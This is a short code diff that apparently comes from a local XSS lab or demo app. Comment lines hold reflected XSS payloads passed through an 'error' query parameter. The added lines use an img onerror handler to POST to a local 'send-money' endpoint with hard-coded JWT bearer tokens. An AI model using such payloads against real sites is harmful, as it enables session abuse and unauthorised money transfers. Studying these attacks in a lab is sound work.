@@ -109,3 +109,5 @@ export default App;
 // http://localhost:5173/?error=<img src=x onerror="alert('XSS')">
 // http://localhost:5173/?error=<img src onerror=alert(JSON.stringify(localStorage)) />
 
+// http://localhost:5173/?error=<img src=x onerror="fetch('http://localhost:4000/send-money',{method:'POST',headers:{Authorization:'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFAYSIsImlhdCI6MTc1MjExOTQxMCwiZXhwIjoxNzUyMTIzMDEwfQ.hU8nn-ZV1KlhixpJCBQ5B-TFSuX42H9NBlkqm_iApwA'}}).then(r=>r.text()).then(alert)">
+// http://localhost:5173/?error=<img src=x onerror="fetch('http://localhost:4000/send-money',{method:'POST',headers:{Authorization:'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJAYiIsImlhdCI6MTc1MjEzMDQwNSwiZXhwIjoxNzUyMTM0MDA1fQ.N6VLIlYKzAbLHVIXFPxUsbG6ZkYWHBJFi3SYToBn2yg'}}).then(r=>r.text()).then(alert)">
